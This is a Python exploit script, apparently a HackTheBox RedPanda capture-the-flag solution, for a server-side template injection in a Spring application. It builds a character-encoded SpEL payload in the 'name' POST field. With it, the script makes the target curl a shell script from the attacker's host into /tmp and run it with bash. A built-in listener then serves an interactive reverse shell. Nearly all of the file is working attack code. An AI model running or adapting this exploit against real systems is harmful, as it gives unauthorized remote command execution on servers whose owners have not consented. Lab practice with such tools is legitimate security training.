#!/usr/bin/env python3
import urllib3
import requests
import argparse
from time import sleep
from nclib import TCPServer
from sys import argv,stdout
from textwrap import dedent
from threading import Thread

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

cyan = '\033[1;36m'
green = '\033[1;32m'
yellow = '\033[1;33m'
red = '\033[1;31m'
noco = '\033[0m'

def pretty_print(color, symbol, msg):
    print(f"{color}[{symbol}] {msg}{noco}")

def print_warning(msg):
    pretty_print(yellow, "!", msg)

def print_success(msg):
    pretty_print(green, "+", msg)

def print_fail(msg):
    pretty_print(red, "-", msg)

def print_info(msg):
    pretty_print(cyan, "*", msg)

def start_listener():
    try:
        lhost = args.lhost
        lport = args.lport
        print_info(f"Starting listener on {lhost}:{lport}")
        listener = TCPServer((lhost, int(lport)))
        for client in listener:
            print_success("Target connected")
            cmd = ""
            while cmd != "exit":
                if len(cmd) > 0:
                    if cmd in client.readln().decode("utf-8").strip(" "):
                        pass
                data = client.read_until("$")
                print(data.decode("utf-8"), end="")
                cmd = input(" ")
                client.writeln(cmd)
    except KeyboardInterrupt:
        print_fail("[-] Exiting...")
        exit()
    except Exception as error:
        print_fail(error)

def post_data(cmd):
    lst = []
    for i in cmd:
        lst.append(str(ord(i)))
    data = "name=*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)" % lst[0]
    for i in lst[1:]:
        data += f".concat(T(java.lang.Character).toString({i}))"
    data += ").getInputStream())}"
    return data

def stage_one():
    url = args.url
    lhost = args.lhost
    cmd = f"/usr/bin/curl http://{lhost}/shell.sh --output /tmp/shell.sh"
    headers = {'Content-Type':'application/x-www-form-urlencoded'}
    data = post_data(cmd)
    print_warning("Sending stage 1")
    r = requests.post(url, headers=headers, data=data, proxies=proxies)

    if (r.status_code == 200):
        print_success("Exploit transferred")
    else:
        print_fail("Exploit failed to transfer")

def stage_two():
    url = args.url
    cmd = f"bash /tmp/shell.sh"
    headers = {'Content-Type':'application/x-www-form-urlencoded'}
    data = post_data(cmd)
    print_warning("Sending stage 2")
    requests.post(url, headers=headers, data=data, proxies=proxies)

def main():
    Thread(target=start_listener).start()
    sleep(2)
    stage_one()
    stage_two()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="", formatter_class=argparse.RawDescriptionHelpFormatter, epilog=dedent(f'''

    HackTheBox RedPanda Server-Side Template Injection

'''))

    parser.add_argument('-u', '--url', help='Target URL')
    parser.add_argument('-l', '--lhost', help='Listening address')
    parser.add_argument('-p', '--lport', type=int, help='Listening port')
    global args
    args = parser.parse_args()
    if len(argv) == 1:
        parser.print_help()
        parser.exit()
    else:
        main()